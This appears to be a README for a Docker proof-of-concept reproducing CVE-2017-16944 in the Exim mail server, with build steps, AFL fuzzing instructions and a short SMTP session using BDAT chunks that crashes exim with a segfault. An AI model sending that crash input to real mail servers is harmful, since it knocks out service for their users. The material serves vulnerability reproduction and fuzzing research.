# Simple POC with docker image

To build the image, run 
```bash
docker build -t exim-16944 .
`

To reproduce the exploitable vuln:
```bash
docker run --rm -i exim-16944  < testsuite/cve-2017-16944.txt
```
This will cause a segfault, but docker will exit before you can see it.

If you want to see the segfault, you need to:
1. Run the docker container (`docker run -ti exim-16944 bash `)
```bash
/usr/exim/bin/exim -bs -v
```
2. And then give the input
```bash
EHLO localhost
MAIL FROM:<test@localhost>
RCPT TO:<test@localhost>
BDAT 10
.
BDAT 0

```

You should get a crash:
```
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
```

## Build instructions

You can build this image two ways: binary-only or with afl instrumentation.

Please see [./run.sh](./run.sh) to see how to do this.

## Fuzzing locally with AFL
When you build the image with AFL, you can also fuzz within the image:
```
docker run -ti exim-16944 bash
mkdir out
afl-fuzz -x dictionary.txt -i testsuite -o out -- /usr/exim/bin/exim -bs  -v
```


## What are the jessie and stretch images
These versions do not appear vulnerable.  I include them to show you how to
build an image that contains old versions of software from debian.
